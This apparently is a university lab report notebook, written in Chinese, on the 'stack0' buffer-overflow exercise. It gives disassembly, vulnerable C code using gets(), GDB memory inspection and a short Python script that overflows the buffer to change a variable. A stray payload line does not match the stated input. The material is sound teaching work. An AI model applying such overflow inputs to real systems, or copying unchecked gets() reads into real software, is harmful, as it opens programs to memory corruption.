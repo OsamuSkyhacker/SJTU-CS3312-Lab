{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CS3312 Lab Report Stack0\n",
    "\n",
    "Osamu Takenaka 520030990026"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 源码分析\n",
    "\n",
    "x86汇编代码(由objdump得到)：\n",
    "    \n",
    "```asm\n",
    "080483f4 <main>:\n",
    " 80483f4:\t55                   \tpush   %ebp\n",
    " 80483f5:\t89 e5                \tmov    %esp,%ebp\n",
    " 80483f7:\t83 e4 f0             \tand    $0xfffffff0,%esp\n",
    " 80483fa:\t83 ec 60             \tsub    $0x60,%esp\n",
    " 80483fd:\tc7 44 24 5c 00 00 00 \tmovl   $0x0,0x5c(%esp)\n",
    " 8048404:\t00 \n",
    " 8048405:\t8d 44 24 1c          \tlea    0x1c(%esp),%eax\n",
    " 8048409:\t89 04 24             \tmov    %eax,(%esp)\n",
    " 804840c:\te8 fb fe ff ff       \tcall   804830c <gets@plt>\n",
    " 8048411:\t8b 44 24 5c          \tmov    0x5c(%esp),%eax\n",
    " 8048415:\t85 c0                \ttest   %eax,%eax\n",
    " 8048417:\t74 0e                \tje     8048427 <main+0x33>\n",
    " 8048419:\tc7 04 24 00 85 04 08 \tmovl   $0x8048500,(%esp)\n",
    " 8048420:\te8 07 ff ff ff       \tcall   804832c <puts@plt>\n",
    " 8048425:\teb 0c                \tjmp    8048433 <main+0x3f>\n",
    " 8048427:\tc7 04 24 29 85 04 08 \tmovl   $0x8048529,(%esp)\n",
    " 804842e:\te8 f9 fe ff ff       \tcall   804832c <puts@plt>\n",
    " 8048433:\tc9                   \tleave  \n",
    " 8048434:\tc3                   \tret     \n",
    " ```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "C语言源代码：\n",
    "```c\n",
    "#include <stdlib.h>\n",
    "#include <unistd.h>\n",
    "#include <stdio.h>\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "    volatile int modified;\n",
    "    char buffer[64];\n",
    "\n",
    "    modified = 0;\n",
    "    gets(buffer);\n",
    "\n",
    "    if(modified != 0) {\n",
    "        printf(\"you have changed the 'modified' variable\\n\");\n",
    "    } else {\n",
    "        printf(\"Try again?\\n\");\n",
    "    }\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "这段C程序是一个典型的缓冲区溢出漏洞，\n",
    "\n",
    "其使用`gets`函数从标准输入读取字符串，存储在`buffer`中，`gets`函数不会检查输入的长度，所以可以输入超长字符串，导致缓冲区溢出。通过构造的输入，攻击者可以覆盖`modified`变量的值。\n",
    "\n",
    "代码中可以看出，我们作为攻击者需要做的事情是让`modified`变量不等于0，这样就可以输出`you have changed the 'modified' variable`。\n",
    "\n",
    "所以我们接下来，我们需要知道`buffer`的地址和`modified`的地址，然后通过输入超长字符串来覆盖`modified`的值。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### GDB调试\n",
    "\n",
    "\n",
    "通过 `modified = 0`这句C代码可以很容易找到对应的汇编代码：\n",
    "\n",
    "```asm\n",
    " 80483fd:\tc7 44 24 5c 00 00 00 \tmovl   $0x0,0x5c(%esp)\n",
    "```\n",
    "不难看出，modfied变量的地址是0x5c加上寄存器esp的值。\n",
    "\n",
    "接下来我们需要通过gdb，来查看esp的值，以及buffer的地址。\n",
    "\n",
    "<img src=\"https://cdn.mathpix.com/snip/images/6vOs-rHAWbEBPPnGCmyjgDtR2YT9tPu8ZNG2ef7yJWg.original.fullsize.png\" width=\"50%\">\n",
    "\n",
    "添加函数main的断点，然后运行"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<img src=\"https://cdn.mathpix.com/snip/images/NfmftXQiY8zhNEi5xWPywl5d7k5YmQ-HXTLgqrIBHYg.original.fullsize.png\" width=\"75%\">\n",
    "\n",
    "为了在接下来打印内存时更容易找到`buffer`的区域，并且`buffer`的大小就是64个Byte，我们在输入时输入64个'a'\n",
    "\n",
    "<img src=\"https://cdn.mathpix.com/snip/images/im2g8OagSwDcABAKlGxDocB4nUouZU4WGJTJJnXOlp0.original.fullsize.png\" width=\"30%\">\n",
    "\n",
    "打印`%esp`的值，得到`%esp=0xff9600a0`，然后通过`%esp`的值加上0x5c得到`modified`的地址是`0xff9600fc`\n",
    "得到\n",
    "\n",
    "<img src=\"https://cdn.mathpix.com/snip/images/rdzqwKm6iTJUbtQ78iEDd6DOcZ8fz7MKPMmlcWaeEcA.original.fullsize.png\" width=\"50%\">\n",
    "\n",
    "然后我们需要打印`0xff9600a0`开始的内存区域，找到buffer的地址区域\n",
    "\n",
    "<img src=\"https://cdn.mathpix.com/snip/images/9qulViJEsdSZUFaWqbXu_xNBBQbcFwHIOfssVN5QdC0.original.fullsize.png\" width=\"50%\">\n",
    "\n",
    "可以很明显地看到大片的‘a'即`0x61`，即为buffer的地址区域，为`0xff9600bc`至`0xff9600fb`\n",
    "我们定位到`modified`的地址`0xff9600fc`，可以发现它就紧挨着buffer的地址区域结束的地方。\n",
    "\n",
    "于是我们只要输入64个字符后，再输入1个字符，就可以覆盖`modified`的值。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 攻击脚本内容\n",
    "\n",
    "内容如下，64个'a'再加上1个'1'\n",
    "\n",
    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdcba\n",
    "\n",
    "script_stack0.py:\n",
    "\n",
    "```python\n",
    "input = 'a'*64 + '1'\n",
    "print input\n",
    "```\n",
    "在终端中运行：\n",
    "\n",
    "```bash\n",
    "（python script_stack0.py) | ./stack0\n",
    "```\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 结果（非GDB环境）\n",
    "<img src=\"https://cdn.mathpix.com/snip/images/cJE0zy6Vk_yNCnUy-C0jn5hrTsRzFE62vvN1qHL0ujs.original.fullsize.png\" width=\"50%\">\n",
    "\n",
    "攻击成功"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
